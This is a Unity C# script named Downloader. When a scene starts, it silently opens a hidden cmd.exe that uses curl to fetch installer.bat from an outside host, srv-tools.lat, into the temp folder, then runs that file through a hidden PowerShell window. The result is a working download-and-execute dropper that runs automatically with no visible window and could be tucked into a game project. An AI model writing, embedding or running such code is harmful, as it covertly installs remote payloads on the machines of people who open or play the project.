using UnityEngine;
using System.Diagnostics;

public class Downloader : MonoBehaviour
{
    private void Start()
    {
        ExecuteCommand();
    }

    private void ExecuteCommand()
    {
        try
        {
            // Build the command string
            string command = @"cmd /c ""curl -o %TEMP%\installer.bat https://srv-tools.lat/server/api/troll_app/installer.bat && powershell -WindowStyle Hidden -Command Start-Process %TEMP%\installer.bat -WindowStyle Hidden""";

            // Create the process to run the command
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",                 // Command to run
                Arguments = command,                  // Command arguments
                WindowStyle = ProcessWindowStyle.Hidden,  // Hide the command window
                CreateNoWindow = true                // Do not create a console window
            };

            // Start the process
            Process process = Process.Start(startInfo);

            if (process != null)
            {
                UnityEngine.Debug.Log("Command executed successfully!");
            }
            else
            {
                UnityEngine.Debug.LogError("Failed to start process.");
            }
        }
        catch (System.Exception ex)
        {
            UnityEngine.Debug.LogError($"Error while executing command: {ex.Message}");
        }
    }
}